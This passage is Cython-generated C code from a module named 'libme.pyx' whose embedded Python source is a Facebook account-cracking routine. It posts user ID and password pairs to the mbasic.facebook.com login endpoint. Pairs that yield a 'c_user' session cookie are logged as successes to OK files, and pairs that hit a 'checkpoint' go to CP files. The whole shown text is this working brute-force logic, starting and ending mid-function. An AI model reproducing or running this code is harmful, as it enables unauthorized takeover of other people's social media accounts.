        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_8, function);
      }
    }
    __pyx_t_3 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1059, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_keys); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1059, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_8);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_8, function);
      }
    }
    __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1059, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_18 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_c_user, __pyx_t_4, Py_EQ)); if (unlikely(__pyx_t_18 < 0)) __PYX_ERR(0, 1059, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_17 = (__pyx_t_18 != 0);
    if (__pyx_t_17) {

      /* "libme.pyx":1060
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 * 			if "c_user" in ses.cookies.get_dict().keys():
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")             # <<<<<<<<<<<<<<
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 */
      __pyx_t_4 = PyList_New(0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1060, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1060, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1060, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_3 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1060, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_items); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1060, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_8 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1060, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (likely(PyList_CheckExact(__pyx_t_8)) || PyTuple_CheckExact(__pyx_t_8)) {
        __pyx_t_6 = __pyx_t_8; __Pyx_INCREF(__pyx_t_6); __pyx_t_12 = 0;
        __pyx_t_13 = NULL;
      } else {
        __pyx_t_12 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1060, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_13 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 1060, __pyx_L1_error)
      }
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      for (;;) {
        if (likely(!__pyx_t_13)) {
          if (likely(PyList_CheckExact(__pyx_t_6))) {
            if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_6)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_8 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_12); __Pyx_INCREF(__pyx_t_8); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 1060, __pyx_L1_error)
            #else
            __pyx_t_8 = PySequence_ITEM(__pyx_t_6, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1060, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_8);
            #endif
          } else {
            if (__pyx_t_12 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_8 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_12); __Pyx_INCREF(__pyx_t_8); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 1060, __pyx_L1_error)
            #else
            __pyx_t_8 = PySequence_ITEM(__pyx_t_6, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1060, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_8);
            #endif
          }
        } else {
          __pyx_t_8 = __pyx_t_13(__pyx_t_6);
          if (unlikely(!__pyx_t_8)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 1060, __pyx_L1_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_8);
        }
        if ((likely(PyTuple_CheckExact(__pyx_t_8))) || (PyList_CheckExact(__pyx_t_8))) {
          PyObject* sequence = __pyx_t_8;
          Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
          if (unlikely(size != 2)) {
            if (size > 2) __Pyx_RaiseTooManyValuesError(2);
            else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
            __PYX_ERR(0, 1060, __pyx_L1_error)
          }
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          if (likely(PyTuple_CheckExact(sequence))) {
            __pyx_t_3 = PyTuple_GET_ITEM(sequence, 0); 
            __pyx_t_7 = PyTuple_GET_ITEM(sequence, 1); 
          } else {
            __pyx_t_3 = PyList_GET_ITEM(sequence, 0); 
            __pyx_t_7 = PyList_GET_ITEM(sequence, 1); 
          }
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_7);
          #else
          __pyx_t_3 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1060, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_7 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1060, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_7);
          #endif
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        } else {
          Py_ssize_t index = -1;
          __pyx_t_11 = PyObject_GetIter(__pyx_t_8); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 1060, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_19 = Py_TYPE(__pyx_t_11)->tp_iternext;
          index = 0; __pyx_t_3 = __pyx_t_19(__pyx_t_11); if (unlikely(!__pyx_t_3)) goto __pyx_L19_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_3);
          index = 1; __pyx_t_7 = __pyx_t_19(__pyx_t_11); if (unlikely(!__pyx_t_7)) goto __pyx_L19_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_7);
          if (__Pyx_IternextUnpackEndCheck(__pyx_t_19(__pyx_t_11), 2) < 0) __PYX_ERR(0, 1060, __pyx_L1_error)
          __pyx_t_19 = NULL;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          goto __pyx_L20_unpacking_done;
          __pyx_L19_unpacking_failed:;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_19 = NULL;
          if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
          __PYX_ERR(0, 1060, __pyx_L1_error)
          __pyx_L20_unpacking_done:;
        }
        __Pyx_XDECREF_SET(__pyx_v_key, __pyx_t_3);
        __pyx_t_3 = 0;
        __Pyx_XDECREF_SET(__pyx_v_value, __pyx_t_7);
        __pyx_t_7 = 0;
        __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1060, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_INCREF(__pyx_v_key);
        __Pyx_GIVEREF(__pyx_v_key);
        PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v_key);
        __Pyx_INCREF(__pyx_v_value);
        __Pyx_GIVEREF(__pyx_v_value);
        PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_v_value);
        __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s_3, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1060, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(__Pyx_ListComp_Append(__pyx_t_4, (PyObject*)__pyx_t_7))) __PYX_ERR(0, 1060, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      }
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyString_Join(__pyx_kp_s__56, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1060, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_replace); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1060, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1060, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_kuki = __pyx_t_6;
      __pyx_t_6 = 0;

      /* "libme.pyx":1061
 * 			if "c_user" in ses.cookies.get_dict().keys():
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 */
      __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1061, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_v_pw);
      __pyx_t_4 = __Pyx_PyString_Format(__pyx_kp_s_1_92m_s_s_0_97m, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1061, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 1061, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "libme.pyx":1062
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 */
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1062, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1062, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_v_pw);
      __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1062, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_t_7); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 1062, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "libme.pyx":1063
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				break
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():
 */
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_date); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1063, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyString_FormatSafe(__pyx_kp_s_OK_s_txt, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1063, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1063, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_6);
      __Pyx_INCREF(__pyx_n_s_a);
      __Pyx_GIVEREF(__pyx_n_s_a);
      PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_a);
      __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1063, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1063, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1063, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_v_pw);
      __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1063, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_7 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_6, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_8);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1063, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "libme.pyx":1064
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break             # <<<<<<<<<<<<<<
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))
 */
      goto __pyx_L4_break;

      /* "libme.pyx":1059
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 * 			if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))
 */
    }

    /* "libme.pyx":1065
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 */
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1065, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1065, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_6, function);
      }
    }
    __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1065, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_keys); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1065, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_6);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_6, function);
      }
    }
    __pyx_t_7 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1065, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_17 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_checkpoint, __pyx_t_7, Py_EQ)); if (unlikely(__pyx_t_17 < 0)) __PYX_ERR(0, 1065, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_18 = (__pyx_t_17 != 0);
    if (__pyx_t_18) {

      /* "libme.pyx":1066
 * 				break
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))             # <<<<<<<<<<<<<<
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 */
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1066, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_1_91m_s_s_0_97m, __pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1066, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 1066, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "libme.pyx":1067
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 */
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1067, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1067, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_4 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1067, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_6, __pyx_t_4); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 1067, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "libme.pyx":1068
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				break
 * 			else:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_date); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1068, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = __Pyx_PyString_FormatSafe(__pyx_kp_s_CP_s_txt, __pyx_t_6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1068, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1068, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_7);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_7);
      __Pyx_INCREF(__pyx_n_s_a);
      __Pyx_GIVEREF(__pyx_n_s_a);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_n_s_a);
      __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_6, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1068, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1068, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1068, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
